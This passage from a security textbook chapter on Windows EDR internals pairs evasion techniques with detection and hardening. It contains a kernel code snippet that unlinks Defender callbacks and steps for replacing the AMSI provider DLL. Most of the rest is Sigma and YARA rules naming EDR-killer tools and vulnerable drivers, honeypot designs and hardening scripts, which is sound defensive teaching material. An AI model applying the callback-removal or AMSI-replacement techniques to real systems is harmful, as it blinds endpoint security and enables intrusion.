    CM_CALLBACK_ENTRY *cb = CONTAINING_RECORD(e, CM_CALLBACK_ENTRY, CallbackList);
    if (IsInModuleRange(cb->Function, "MsMpEng.sys")) {
        e->Blink->Flink = e->Flink;
        e->Flink->Blink = e->Blink;
    }
}
```

**Real-world tools:** `EDRSandblast` (open-source, by Wavestone) automates enumeration and removal of process/thread/image callbacks, object callbacks, registry callbacks, and minifilter callbacks. It includes offsets for multiple Windows builds and supports both vulnerable driver and manual kernel R/W primitives.

**Detection.** Monitor for `EDRSandblast` signatures (YARA rule in §6). Periodic self-check: EDR should verify its own callbacks are still registered — poll `ObRegisterCallbacks` return handle, re-register if missing. HVCI prevents unsigned driver loads, blocking the BYOVD prerequisite.

### 4.7 AMSI provider DLL replacement

Beyond in-memory patching (§1.5), attackers can replace the AMSI provider DLL on disk. Windows Defender's AMSI provider is `MpOav.dll` (in `%ProgramFiles%\Windows Defender\`). If the attacker has write access to this path (e.g., via EoP or exploiting a service running as SYSTEM), they can:

1. Replace `MpOav.dll` with a stub that exports the required AMSI provider interfaces (`AmsiScanBuffer`, `AmsiScanString`, `AmsiNotifyOperation`, etc.) but always returns `AMSI_RESULT_CLEAN`
2. Stop/restart the Windows Defender service to force re-load
3. Alternative: hijack the COM registration in `HKLM\SOFTWARE\Classes\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}` to point to a custom DLL (requires admin)

This persists across process restarts — unlike in-memory patching, which must be re-applied per process.

**Detection.** File-integrity monitoring on `%ProgramFiles%\Windows Defender\MpOav.dll` (hash baseline). Tamper Protection in Windows Defender prevents modification of Defender files and registry keys — verify Tamper Protection is enabled via `Get-MpPreference | Select-Object -Property DisableTamperProtection`. COM registration monitoring for AMSI provider CLSIDs in both `HKLM` and `HKCU`.

---

## 5. EDR Internals and Architecture

### 5.1 EDR sensor architecture

A modern EDR agent operates across four visibility layers, each providing distinct telemetry:

**Layer 1: Kernel callbacks and minifilters.**

| Callback API | What it monitors | Data provided |
|-------------|------------------|---------------|
| `PsSetCreateProcessNotifyRoutineEx` | Process creation/termination | PID, parent PID, image path, command line, token |
| `PsSetCreateThreadNotifyRoutine` | Thread creation | TID, start address, process context |
| `PsSetLoadImageNotifyRoutine` | Image (DLL/driver) loading | Image path, base address, process context |
| `ObRegisterCallbacks` | Handle operations (open process/thread) | Requested access rights, source/target process |
| `CmRegisterCallbackEx` | Registry operations | Key path, value name, operation type |
| `FltRegisterFilter` (minifilter) | File I/O operations | File path, operation (create/write/rename/delete), process |
| `TdiFlt` / `WFP callout` | Network connections | Source/dest IP:port, protocol, process, payload sampling |

**Layer 2: ETW providers.**

The EDR subscribes to kernel and user-mode ETW providers as a real-time consumer:

| Provider | GUID | Key events |
|----------|------|------------|
| `Microsoft-Windows-Threat-Intelligence` | `f4e1897c-bb5d-5668-f1d8-040f4d8dd344` | Cross-process memory operations, `NtSetContextThread`, image mapping. Requires PPL consumer |
| `Microsoft-Windows-Kernel-Process` | `22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716` | Process/thread start/stop, image load (kernel-generated, survives user-mode ETW patch) |
| `Microsoft-Windows-Kernel-File` | `edd08927-9cc4-4e65-b970-c2560fb5c289` | File create, rename, delete |
| `Microsoft-Windows-Kernel-Network` | `7dd42a49-5329-4832-8dfd-43d979153a88` | TCP/UDP connect, accept, send/receive |
| `Microsoft-Windows-DotNETRuntime` | `e13c0d23-ccbc-4e12-931b-d9cc2eee27e4` | JIT compilation, `Assembly.Load`, GC events |
| `Microsoft-Windows-PowerShell` | `a0c1853b-5c40-4b15-8766-3cf1c58f985a` | Script block logging, module load, pipeline execution |
| `Microsoft-Windows-AMSI` | `2a576b87-09a7-520e-c21a-4942f0271d67` | Scan requests and results |

**Layer 3: User-mode hooks (ntdll inline hooking).**

The EDR's injected DLL patches the prologue of critical `ntdll.dll` exports (§1.1). This provides argument-level visibility before the syscall enters the kernel. Limitations: entirely bypassable from user mode (§1.2–§1.3, §4.1–§4.4).

**Layer 4: Cloud/behavioral engine.**

The agent streams telemetry to a cloud backend for:
- Behavioral rule evaluation (sequences of events across time windows)
- ML model inference (anomaly detection on process trees, file operations, network patterns)
- IOC matching (hashes, IPs, domains, certificate thumbprints)
- Threat intelligence correlation (STIX/TAXII feeds, vendor-specific intel)

### 5.2 How EDRs detect: correlation and decision pipeline

**Event correlation model.** EDRs do not alert on individual syscalls. They correlate sequences of events within a time window, typically following the attack chain:

```
Process creation → Memory allocation → Memory write → Thread creation/APC → Network connection
     ↓                    ↓                 ↓               ↓                      ↓
  PsNotify          ObCallback         ETW TI         PsThread/ETW TI        WFP/ETW Net
```

A single `NtAllocateVirtualMemory` call is benign. `NtAllocateVirtualMemory(RWX)` → `NtWriteVirtualMemory(cross-process)` → `NtCreateThreadEx(cross-process, start_in_allocated_region)` within 5 seconds is a process injection chain — high-confidence alert.

**Behavioral rule example (pseudocode):**

```
RULE process_injection_chain:
  SEQUENCE within 10s in same_source_process:
    e1: NtAllocateVirtualMemory(target != self, protect contains EXECUTE)
    e2: NtWriteVirtualMemory(target == e1.target, address in e1.region)
    e3: NtCreateThreadEx(target == e1.target, start_address in e1.region) OR
        NtQueueApcThread(target == e1.target, apc_routine in e1.region)
  EXCLUDE:
    source_process.signer == "Microsoft" AND source_process.path in system32
  ACTION: BLOCK e3, ALERT critical
```

**ML model inputs.** Typical feature vectors for the behavioral ML model:

| Feature | Type | Signal |
|---------|------|--------|
| Process tree depth | Integer | Deep trees (>5 levels) from Office/browser = suspicious |
| Unsigned code execution ratio | Float | High ratio of unsigned image loads = anomalous |
| API call entropy | Float | Unusual API call distribution vs. baseline for process name |
| Network destination novelty | Boolean | First-seen domain + encrypted + non-standard port |
| Memory region characteristics | Categorical | Unbacked RWX regions in non-JIT process |
| Time-of-day | Categorical | Off-hours activity from typically daytime processes |

**False positive management.** EDRs maintain per-organization baselines. A custom internal tool that performs cross-process memory operations generates a behavioral alert until the SOC whitelists it. The whitelist entry includes signer hash, path, and behavioral pattern — not just process name (which can be spoofed).

### 5.3 EDR kernel driver protections

**Driver Signing Enforcement (DSE).** Since Windows Vista x64, all kernel drivers must be signed by a Microsoft-trusted CA. WHQL (Windows Hardware Quality Labs) signing is the standard path. Cross-signing was deprecated in Windows 10 1607 for new drivers. Attackers bypass DSE via:
- BYOVD — loading a legitimately signed but vulnerable driver
- Leaked or stolen EV code-signing certificates
- Exploiting a DSE bypass vulnerability (rare, high-value, quickly patched)
- Disabling DSE via `bcdedit /set testsigning on` (requires admin + reboot, detected)

**HVCI (Hypervisor-protected Code Integrity).** HVCI runs code-integrity checks in VTL 1 (the Secure World of Hyper-V). The hypervisor enforces that only signed code pages can be marked executable in the kernel. This prevents:
- Loading unsigned kernel drivers
- Modifying existing kernel code pages (patching callbacks, syscall table)
- Allocating executable kernel memory and writing to it

**Secure Kernel (VBS/VTL 1).** Credential Guard (LSASS isolated in VTL 1), Secure Launch (DRTM — Dynamic Root of Trust for Measurement), and Kernel Data Protection (KDP — marking kernel data structures read-only via the hypervisor) run in VTL 1. An attacker with kernel R/W in VTL 0 cannot access VTL 1 memory.

**Implication for EDR evasion.** On HVCI-enabled systems, the BYOVD approach (§4.5, §4.6) is severely constrained — the vulnerable driver cannot execute unsigned code or modify protected kernel data. Attackers must find signed drivers with IOCTLs that perform the desired operations natively (e.g., `RTCore64.sys` provides mapped physical memory access, which HVCI does not block because the driver itself is signed).

### 5.4 EDR testing methodology

**Comparative detection testing framework:**

| Phase | Method | Metrics |
|-------|--------|---------|
| Atomic technique execution | Run individual MITRE ATT&CK techniques from Atomic Red Team / MITRE Caldera | Detection rate per technique, time-to-detect |
| Chained attack simulation | Multi-stage attack (phishing → execution → injection → C2 → lateral → exfil) | Chain detection rate, earliest detection stage |
| Evasion testing | Execute each technique with known evasion wrappers (sleep masking, syscall proxying, AMSI bypass) | Evasion success rate, which EDR layers catch which variants |
| False positive assessment | Run legitimate admin tools (PsExec, WinRM, PowerShell remoting, SCCM) in production patterns | FP rate per category, tuning effort required |
| Telemetry completeness | Verify that each technique generates the expected telemetry (ETW events, callback triggers) even when not alerted | Telemetry coverage percentage |
| Performance impact | Measure system overhead: CPU, memory, disk I/O, boot time with EDR active | Overhead percentages, user-noticeable delays |

**Tool ecosystem for EDR testing:**

| Tool | Purpose | License |
|------|---------|---------|
| Atomic Red Team | Individual technique execution with YAML-defined tests | Apache 2.0 |
| MITRE Caldera | Automated adversary emulation platform | Apache 2.0 |
| Infection Monkey (Akamai) | Autonomous breach-and-attack simulation | GPLv3 |
| Prelude Operator | Adversary emulation with EDR-awareness | Commercial |
| SafeBreach / AttackIQ | Enterprise BAS (Breach and Attack Simulation) | Commercial |
| DetectionLab (Chris Long) | Pre-built lab with Sysmon, Splunk, osquery, Velociraptor | MIT |

### 5.5 Common EDR weaknesses: blind spots by detection layer

| Detection Layer | Blind Spot | Exploited By |
|----------------|------------|-------------|
| User-mode hooks | Entire layer bypassable via unhooking, direct/indirect syscalls, hardware breakpoints | §1.2, §1.3, §4.1 |
| ETW (user-mode) | Patchable from within the process; provider disabling via BYOVD | §1.4, §4.5 |
| ETW (kernel TI) | Requires PPL consumer; vulnerable to BYOVD kernel-level disabling | §4.5 |
| Kernel callbacks | Removable via BYOVD kernel R/W | §3A.5, §4.6 |
| Minifilters | Can be unloaded via `fltmc unload` (requires admin) or BYOVD callback removal | §4.6 |
| Behavioral rules | Defeated by slowing the attack chain (spacing operations across long time windows), living-off-the-land binaries, or splitting across multiple processes | §1.6 (LOLBAS) |
| ML models | Adversarial evasion: mimicking legitimate process behavior, gradual credential access, low-and-slow exfiltration | Active research area |
| Cloud backend | Offline/air-gapped systems have no cloud correlation; network segmentation can block agent → cloud comms | Configuration-dependent |
| Boot-time gap | EDR agent starts after kernel + some services; malware with early boot persistence executes in the gap | Early-boot persistence, bootkits |

---

## 6. Cross-Platform Evasion Detection Engineering

This section provides detection rules for the advanced techniques introduced in §4–§5. For detection of foundational techniques (NTDLL unhooking, basic ETW patching, AMSI reflection bypass, basic direct syscalls, eBPF rootkits), see §3D.

### 6.1 Sigma rules

**Hardware breakpoint syscall invocation:**

```yaml
title: Debug Register Modification for Syscall Evasion
id: 1a2b3c4d-5e6f-7890-abcd-ef0123456789
status: experimental
description: >
  NtSetContextThread or SetThreadContext modifying debug registers (DR0-DR3)
  from a non-debugger process — hardware breakpoint syscall invocation indicator.
logsource:
    product: windows
    category: process_access
detection:
    selection:
        EventID: 10
        GrantedAccess|contains:
            - '0x1FFFFF'   # PROCESS_ALL_ACCESS
            - '0x001F0FFF' # THREAD_ALL_ACCESS
            - '0x0010'     # THREAD_SET_CONTEXT
    filter_debuggers:
        SourceImage|endswith:
            - '\devenv.exe'
            - '\windbg.exe'
            - '\x64dbg.exe'
            - '\ollydbg.exe'
            - '\ida.exe'
            - '\ida64.exe'
    filter_system:
        SourceImage|startswith: 'C:\Windows\System32\'
    condition: selection and not filter_debuggers and not filter_system
falsepositives: [Custom debuggers, game anti-cheat engines]
level: high
tags: [attack.defense_evasion, attack.t1106]
```

**ETW provider disabled at kernel level:**

```yaml
title: ETW Threat Intelligence Provider Stopped or Disabled
id: 2b3c4d5e-6f7a-8901-bcde-f12345678901
status: experimental
description: >
  Canary event from ETW Threat Intelligence provider missing — indicates
  kernel-level provider disabling via BYOVD or direct kernel manipulation.
logsource:
    product: windows
    service: etw_canary
detection:
    selection:
        EventType: 'CanaryMissing'
        ProviderGuid: 'f4e1897c-bb5d-5668-f1d8-040f4d8dd344'
    condition: selection
falsepositives: [ETW consumer crash, service restart window]
level: critical
tags: [attack.defense_evasion, attack.t1562.001]
```

**Early bird APC injection pattern:**

```yaml
title: Early Bird APC Injection via Suspended Process
id: 3c4d5e6f-7a8b-9012-cdef-234567890123
status: experimental
description: >
  Process created suspended followed by cross-process APC queuing before
  the target generates normal telemetry — early bird injection indicator.
logsource:
    product: windows
    category: process_creation
detection:
    selection_create:
        EventID: 1
        ParentCreationFlags|contains: 'SUSPENDED'
    selection_apc:
        EventType: 'NtQueueApcThread'
        TargetPID: '%selection_create.TargetPID%'
    timeframe: 3s
    condition: selection_create | near selection_apc
falsepositives: [Legitimate process launchers using suspended creation (rare)]
level: critical
tags: [attack.defense_evasion, attack.t1055.004]
```

**NtQueueApcThreadEx2 special user APC:**

```yaml
title: Special User APC via NtQueueApcThreadEx2
id: 4d5e6f7a-8b9c-0123-defa-345678901234
status: experimental
description: >
  NtQueueApcThreadEx2 with QUEUE_USER_APC_SPECIAL_USER_APC flag from
  cross-process context — immediate APC execution without alertable wait.
logsource:
    product: windows
    category: api_call
detection:
    selection:
        ApiCall: 'NtQueueApcThreadEx2'
        QueueFlags: 1
    filter_self:
        SourcePID: '%TargetPID%'
    condition: selection and not filter_self
falsepositives: [None known in legitimate software]
level: critical
tags: [attack.defense_evasion, attack.t1055.004]
```

**Thread name injection anomaly:**

```yaml
title: Suspicious Thread Name Setting via Cross-Process SetThreadDescription
id: 5e6f7a8b-9c0d-1234-efab-456789012345
status: experimental
description: >
  SetThreadDescription / NtSetInformationThread(ThreadNameInformation)
  targeting a thread in a different process with large name buffer —
  thread name-based code injection indicator.
logsource:
    product: windows
    category: api_call
detection:
    selection:
        ApiCall|contains: 'NtSetInformationThread'
        InformationClass: 'ThreadNameInformation'
    filter_self:
        SourcePID: '%TargetPID%'
    filter_small:
        DataSize|lt: 256
    condition: selection and not filter_self and not filter_small
falsepositives: [Diagnostic tools naming threads in child processes]
level: high
tags: [attack.defense_evasion, attack.t1055]
```

**Minifilter unload attempt:**

```yaml
title: File System Minifilter Unload Attempt
id: 6f7a8b9c-0d1e-2345-fabc-567890123456
status: experimental
description: >
  fltmc.exe unload or FltUnloadFilter API call targeting security-related
  minifilters — EDR tampering indicator.
logsource:
    product: windows
    category: process_creation
detection:
    selection_fltmc:
        EventID: 1
        Image|endswith: '\fltmc.exe'
        CommandLine|contains: 'unload'
    selection_api:
        ApiCall: 'FltUnloadFilter'
    filter_update:
        ParentImage|endswith: ['\msiexec.exe', '\TiWorker.exe']
    condition: (selection_fltmc or selection_api) and not filter_update
falsepositives: [Legitimate filter driver updates during patching]
level: critical
tags: [attack.defense_evasion, attack.t1562.001]
```

**EDR service tampering:**

```yaml
title: EDR Service Stop or Configuration Change
id: 7a8b9c0d-1e2f-3456-abcd-678901234567
status: experimental
description: >
  Attempt to stop, disable, or reconfigure an EDR service — may indicate
  pre-ransomware EDR killing.
logsource:
    product: windows
    service: system
detection:
    selection_stop:
        EventID: 7036
        param1|contains:
            - 'CrowdStrike'
            - 'CarbonBlack'
            - 'SentinelOne'
            - 'Microsoft Defender'
            - 'Cortex XDR'
            - 'Cylance'
            - 'Symantec Endpoint'
            - 'Elastic Endpoint'
        param2: 'stopped'
    selection_config:
        EventID: 7040
        param1|contains:
            - 'csagent'
            - 'CbDefense'
            - 'SentinelAgent'
            - 'WinDefend'
            - 'Traps'
    condition: selection_stop or selection_config
falsepositives: [Legitimate EDR maintenance, agent updates]
level: critical
tags: [attack.defense_evasion, attack.t1562.001]
```

### 6.2 YARA rules

**SysWhispers3 egg-hunter stub pattern:**

```yara
rule SysWhispers3_EggHunter {
    meta:
        description = "SysWhispers3 egg-hunter syscall stub — random marker patched at runtime"
        severity = "critical"
        mitre = "T1106"
    strings:
        // mov r10, rcx; mov eax, <marker>; jmp <offset> pattern
        $stub1 = { 4C 8B D1 B8 [4] E9 [4] }
        // egg-hunter scan loop — searching for marker in .text
        $scan  = { 8B 01 3D [4] 74 ?? 48 FF C1 EB }
        // SSN patching — write resolved SSN into stub
        $patch = { 89 [1-3] 04 [0-4] 4C 8B D1 B8 }
    condition:
        uint16(0) == 0x5A4D and filesize < 10MB and
        not pe.is_signed and ($stub1 and ($scan or $patch))
}
```

**AMSI bypass shellcode patterns:**

```yara
rule AMSI_Bypass_Shellcode {
    meta:
        description = "Common AMSI bypass shellcode patterns in PE"
        severity = "critical"
        mitre = "T1562.001"
    strings:
        // mov eax, E_INVALIDARG; ret (AmsiScanBuffer patch)
        $patch1 = { B8 57 00 07 80 C3 }
        // xor eax, eax; ret (AmsiScanBuffer/EtwEventWrite NOP)
        $patch2 = { 33 C0 C3 }
        // AmsiScanBuffer string (obfuscated concatenation)
        $str1 = "AmsiScan" ascii nocase
        $str2 = "amsiInit" ascii nocase
        // VirtualProtect + amsi.dll combination
        $vp = "VirtualProtect" ascii
        $amsi = "amsi.dll" ascii nocase
    condition:
        uint16(0) == 0x5A4D and filesize < 5MB and
        (($patch1 or $patch2) and ($str1 or $str2)) or
        ($vp and $amsi and ($patch1 or $patch2))
}
```

**EDRSandblast and EDR-killer tool signatures:**

```yara
rule EDR_Killer_Tool {
    meta:
        description = "EDR callback removal / killer tools (EDRSandblast, EDRSilencer, etc.)"
        severity = "critical"
        mitre = "T1562.001"
    strings:
        $s1 = "PspCreateProcessNotifyRoutine" ascii
        $s2 = "PspCreateThreadNotifyRoutine" ascii
        $s3 = "PspLoadImageNotifyRoutine" ascii
        $s4 = "ObRegisterCallbacks" ascii
        $s5 = "CmRegisterCallback" ascii
        $s6 = "FltUnregisterFilter" ascii
        $s7 = "EtwpGuidHashTable" ascii
        $driver1 = "RTCore64.sys" ascii nocase
        $driver2 = "dbutil_2_3.sys" ascii nocase
        $driver3 = "gdrv.sys" ascii nocase
        $driver4 = "ene.sys" ascii nocase
        $tool1 = "EDRSandblast" ascii nocase
        $tool2 = "EDRSilencer" ascii nocase
        $tool3 = "RealBlindingEDR" ascii nocase
    condition:
        uint16(0) == 0x5A4D and filesize < 20MB and
        (3 of ($s*) or 2 of ($driver*) or any of ($tool*))
}
```

### 6.3 Behavioral detection: call stack anomaly analysis

Beyond static Sigma/YARA rules, advanced detection requires runtime call-stack analysis:

**Return address verification.** When an EDR's kernel callback fires (e.g., `NtAllocateVirtualMemory` via `ObRegisterCallbacks`), it captures the thread's user-mode call stack via `RtlWalkFrameChain` or `RtlCaptureStackBackTrace`. For each return address:
1. Check if it falls within an image-backed region (`MEM_IMAGE`) — addresses in `MEM_PRIVATE` or `MEM_MAPPED` (non-image) indicate direct/indirect syscalls from shellcode
2. Verify the return address is preceded by a `call` instruction (5 bytes for near call, 6 for indirect) — a `jmp`-based indirect syscall leaves no `call` predecessor
3. Compare the module name at each frame against expected call chains for the API (e.g., `NtCreateFile` should show `kernel32!CreateFileW` or `kernelbase!CreateFileW` in the chain)

**Anomalous stack patterns:**

| Pattern | Indicates | Confidence |
|---------|-----------|------------|
| `ntdll!NtXxx` → `UNKNOWN(MEM_PRIVATE)` | Direct/indirect syscall from shellcode | High |
| `ntdll!NtXxx` → `ntdll!RtlCreateTimerQueue` → (no user frames) | Timer-based sleep masking (Ekko/Foliage) | High |
| `ntdll!NtXxx` → `kernel32!BaseThreadInitThunk` (only frame) | Return address spoofing | Medium |
| Normal-looking chain but RBP values don't form valid linked list | Stack frame fabrication | Medium |
| `ntdll!KiUserExceptionDispatcher` → `ntdll!NtXxx` | Hardware breakpoint syscall (VEH-based) | High |

### 6.4 Honeypot-based detection

**Canary processes.** Deploy decoy processes that mimic high-value targets:
- `lsass_helper.exe` — any `OpenProcess` with `PROCESS_VM_READ` is an immediate alert (credential dumping attempt)
- Decoy `svchost.exe` with a fake service name — injection attempts trigger alerts
- Process with fake named pipe matching Cobalt Strike default (`\\.\pipe\msagent_*`) — any connection is malicious

**Fake credentials.** Plant credential material that, if used, triggers alerts:
- Honeypot AD account with logon auditing — any authentication attempt is unauthorized
- Fake `LSASS` memory dump containing planted NTLM hashes — hash usage on the network triggers alert
- Decoy SSH keys in `~/.ssh/` with monitoring on the corresponding server

**Canary files.** Drop files in locations attackers enumerate:
- `C:\Users\Administrator\Desktop\passwords.xlsx` — any read triggers alert
- `/root/.bash_history` with fake commands containing honey-token URLs
- Canary tokens embedded in documents (DNS callback on open)

---

## 7. EDR Hardening Deep Dive

### 7.1 Protected Process Light (PPL) configuration

PPL prevents unprivileged processes from opening handles with `PROCESS_VM_READ`, `PROCESS_VM_WRITE`, `PROCESS_CREATE_THREAD`, or `PROCESS_TERMINATE` to protected processes. EDRs run as `PsProtectedSignerAntimalware-Light`.

**Requirements for PPL EDR:**
1. **ELAM (Early Launch Anti-Malware) certificate.** The EDR vendor must obtain a code-signing certificate from Microsoft's ELAM program. The ELAM driver (`WdBoot.sys` for Defender) loads before all other boot-start drivers.
2. **ELAM driver registration.** The driver must be signed with the ELAM certificate and register via `IoRegisterBootDriverCallback`.
3. **Service protection.** The EDR service is configured with PPL protection level via the registry:

```powershell
# Verify PPL status of EDR processes
Get-Process -Name "MsMpEng","csfalconservice","SentinelAgent" | ForEach-Object {
    $proc = $_
    $ppl = (Get-CimInstance Win32_Process -Filter "ProcessId=$($proc.Id)").ExecutionState
    Write-Output "$($proc.Name) [PID $($proc.Id)]"
}

# Check via kernel debugger (windbg):
# dt nt!_EPROCESS Protection <address>
# PS_PROTECTION.Type = PsProtectedTypeProtectedLight (1)
# PS_PROTECTION.Signer = PsProtectedSignerAntimalware (3)
```

**PPL limitations:**
- Admin-level attackers can load a vulnerable signed driver to gain kernel R/W and modify the `_EPROCESS.Protection` field to `0` (removing PPL) — CVE-2022-37969 demonstrated this via CLFS driver
- PPL does not protect against kernel-level attacks (BYOVD with kernel R/W bypasses PPL entirely)
- The `ELAM_INFORMATION` structure can be manipulated if the ELAM driver itself has vulnerabilities
- Debug builds of Windows allow `ProcessDebugFlags` to bypass PPL (`NtSetInformationProcess` with `ProcessDebugFlags`)

### 7.2 HVCI enforcement and driver signing

**Enabling HVCI:**

```powershell
# Enable via registry (requires reboot)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v HypervisorEnforcedCodeIntegrity /t REG_DWORD /d 1 /f

# Enable via bcdedit
bcdedit /set hypervisorlaunchtype auto
bcdedit /set vsmlaunchtype auto

# Verify HVCI status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object -Property VirtualizationBasedSecurityStatus,
                             CodeIntegrityPolicyEnforcementStatus,
                             RequiredSecurityProperties,
                             AvailableSecurityProperties
# VirtualizationBasedSecurityStatus: 2 = Running
# CodeIntegrityPolicyEnforcementStatus: 2 = Enforced
```

**What HVCI blocks:**
- Loading of unsigned kernel drivers (blocks most BYOVD scenarios unless the driver is legitimately signed)
- Kernel memory pages cannot be simultaneously writable and executable (W^X enforcement in kernel space)
- Self-modifying kernel code is prevented
- Certain IOCTLs that map physical memory are blocked (but not all — `RTCore64.sys` physical memory mapping still works under HVCI on some configurations)

**Driver signing requirements under HVCI:**
- All drivers must be WHQL-signed or have a valid Attestation signature
- Cross-signed drivers from before July 2015 may still load (legacy exception)
- The Microsoft Vulnerable Driver Blocklist (`DriverSiPolicy.p7b`) blocks known-vulnerable signed drivers

```powershell
# Update vulnerable driver blocklist
# Automatic via Windows Update, or manual:
$url = "https://aka.ms/VulnerableDriverBlockList"
# Verify current blocklist version:
Get-Item "C:\Windows\System32\CodeIntegrity\driversipolicy.p7b" | Select-Object LastWriteTime
```

### 7.3 Tamper protection: self-defense mechanisms

**Windows Defender Tamper Protection** prevents:
- Disabling real-time protection
- Disabling cloud-delivered protection
- Disabling IOAV (IE/Edge downloads scanning)
- Disabling behavior monitoring
- Removing security intelligence updates
- Modifying Defender registry keys and service configuration

```powershell
# Verify Tamper Protection status
Get-MpPreference | Select-Object -Property IsTamperProtected

# Tamper Protection must be managed via Microsoft 365 Defender portal / Intune
# Cannot be disabled locally when managed centrally — this is the correct configuration
```

**EDR self-protection mechanisms (vendor-independent):**
1. **Service protection:** EDR service runs as PPL; `sc stop` and `sc config` fail with `Access Denied`
2. **Driver self-protection:** EDR minifilter blocks deletion/modification of its own files via minifilter pre-operation callbacks
3. **Registry protection:** `CmRegisterCallback` blocks modification of EDR service registry keys
4. **Watchdog process:** Secondary process monitors the primary EDR service; restarts it if terminated; the watchdog itself is protected
5. **Kernel-level integrity:** EDR kernel driver periodically verifies its own callbacks are still registered; re-registers if removed
6. **Network protection:** EDR agent verifies connectivity to cloud backend; alerts on network isolation attempts (blocking EDR domains)

### 7.4 EDR agent health monitoring

**Heartbeat verification.** The EDR cloud backend expects periodic heartbeats from every enrolled agent. Missing heartbeats trigger:
- Alert to SOC after configurable timeout (typically 15–30 minutes)
- Automated remediation attempt (push restart command via management API)
- Escalation if the agent doesn't recover within a second timeout window

**Health monitoring script (PowerShell):**

```powershell
# EDR health check — adapt service/process names per vendor
$checks = @{
    'ServiceRunning'     = (Get-Service 'WinDefend' -ErrorAction SilentlyContinue).Status -eq 'Running'
    'ProcessAlive'       = (Get-Process 'MsMpEng' -ErrorAction SilentlyContinue) -ne $null
    'RTProtection'       = (Get-MpComputerStatus).RealTimeProtectionEnabled
    'TamperProtection'   = (Get-MpComputerStatus).IsTamperProtected
    'SignaturesRecent'   = ((Get-MpComputerStatus).AntivirusSignatureLastUpdated -gt
                           (Get-Date).AddDays(-2))
    'CloudConnectivity'  = (Get-MpComputerStatus).AMServiceEnabled
    'NtdllIntegrity'     = $true  # placeholder — requires custom check
}

# NTDLL integrity verification
$ntdll = [System.IO.File]::ReadAllBytes(
    "$env:SystemRoot\System32\ntdll.dll")
$mapped = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
    [System.Diagnostics.Process]::GetCurrentProcess().Modules |
    Where-Object { $_.ModuleName -eq 'ntdll.dll' } |
    Select-Object -First 1 -ExpandProperty BaseAddress)
# Compare .text section hashes — divergence indicates unhooking or tampering

$checks.GetEnumerator() | ForEach-Object {
    $status = if ($_.Value) { 'OK' } else { 'FAIL' }
    Write-Output "[$status] $($_.Key)"
}
```

**Integrity checking for Linux EDR agents:**

```bash
#!/bin/bash
# Falco/osquery/CrowdStrike Linux agent health check
CHECKS_PASSED=0
CHECKS_TOTAL=0

check() {
    CHECKS_TOTAL=$((CHECKS_TOTAL + 1))
    if eval "$2"; then
        echo "[OK]   $1"
        CHECKS_PASSED=$((CHECKS_PASSED + 1))
    else
        echo "[FAIL] $1"
    fi
}

check "EDR service running"   "systemctl is-active --quiet falcon-sensor 2>/dev/null"
check "Auditd running"        "systemctl is-active --quiet auditd 2>/dev/null"
check "Audit rules immutable" "auditctl -s 2>/dev/null | grep -q 'enabled 2'"
check "BPF LSM enabled"       "cat /sys/kernel/security/lsm 2>/dev/null | grep -q bpf"
check "Module signing forced" "cat /proc/sys/kernel/modules_disabled 2>/dev/null | grep -q 1 || \
                                grep -q CONFIG_MODULE_SIG_FORCE=y /boot/config-$(uname -r) 2>/dev/null"
check "Lockdown active"       "cat /sys/kernel/security/lockdown 2>/dev/null | grep -q integrity"
check "No rogue BPF progs"    "bpftool prog list 2>/dev/null | wc -l | \
                                awk '{exit (\$1 > 50) ? 1 : 0}'"
check "No hidden modules"     "diff <(lsmod | awk 'NR>1{print \$1}' | sort) \
                                <(cat /proc/modules | awk '{print \$1}' | sort) | \
                                grep -c '^[<>]' | awk '{exit (\$1 > 0) ? 1 : 0}'"

echo ""
echo "Passed: $CHECKS_PASSED / $CHECKS_TOTAL"
```

### 7.5 Deployment best practices

**Full coverage verification.** Before assuming EDR protection:

| Check | Method | Acceptable Result |
|-------|--------|-------------------|
| Agent installed on all endpoints | Query EDR console for asset inventory delta against CMDB/AD | 0 unmanaged endpoints |
| Agent version current | Compare deployed version against vendor latest | Within 1 minor version |
| Agent healthy and reporting | Check last heartbeat timestamp for all agents | All within 30 minutes |
| Kernel driver loaded | Verify EDR driver via `driverquery` / `lsmod` | Present on all endpoints |
| PPL active (Windows) | Verify `_EPROCESS.Protection` for EDR process | PPL-Antimalware on all |
| HVCI enabled | Query `DeviceGuard` CIM class | VBS Running, HVCI Enforced |
| Tamper Protection on | Query Defender / EDR management console | Enabled, centrally managed |
| Vulnerable driver blocklist current | Check `DriverSiPolicy.p7b` date | Updated within 30 days |
| ETW sessions intact | Verify security-relevant ETW sessions are running | All expected sessions active |

**Policy tuning methodology:**

1. **Deploy in audit/detect-only mode** for 2–4 weeks to establish behavioral baselines
2. **Review all alerts** generated during the baseline period — classify as true positive, false positive, or informational
3. **Create exclusions** only for verified false positives — document each exclusion with justification, ticket reference, and review date
4. **Switch to prevent/block mode** with exclusions applied
5. **Monitor exclusion list quarterly** — remove exclusions for decommissioned applications, tighten overly broad exclusions
6. **Test prevention mode** with red team exercises before assuming protection is effective
7. **Never exclude paths** that attackers commonly abuse (`%TEMP%`, `%APPDATA%`, `C:\PerfLogs\`, `/tmp/`, `/dev/shm/`)

---

## 8. Cross-references

**To Chapter 11A:** This chapter describes the attacker's response to the detection methods in Chapter 11A. NTDLL unhooking (§1.2) removes the hooks that detect process injection (11A §1). ETW patching (§1.4) suppresses the telemetry that monitors C2 communications (11A §5). Direct/indirect syscalls (§1.3) bypass the API-level detection of injection primitives (11A §1.2). Advanced injection techniques (§4.2–§4.4) evolve beyond the basic injection methods cataloged in 11A §1. The detection arms race: each evasion technique has a counter-detection, which has a counter-evasion.

**To Domain 2:** Direct/indirect syscalls (§1.3) and hardware breakpoint syscall invocation (§4.1) bypass the syscall dispatch layer described in Chapter 2B §1. eBPF rootkits (§3.4) abuse the BPF infrastructure from Chapter 2C §4.3. PAM configuration (§3.1) is part of the authentication stack gated by LSMs (Chapter 2C §5). `ptrace_scope` (§3.3) is controlled by the Yama LSM (Chapter 2C §5.3). `memfd_create` (§3.2) uses the anonymous file facilities from the VFS layer. EDR kernel driver protections (§5.3) depend on the VBS/HVCI architecture from Domain 2 hypervisor content.

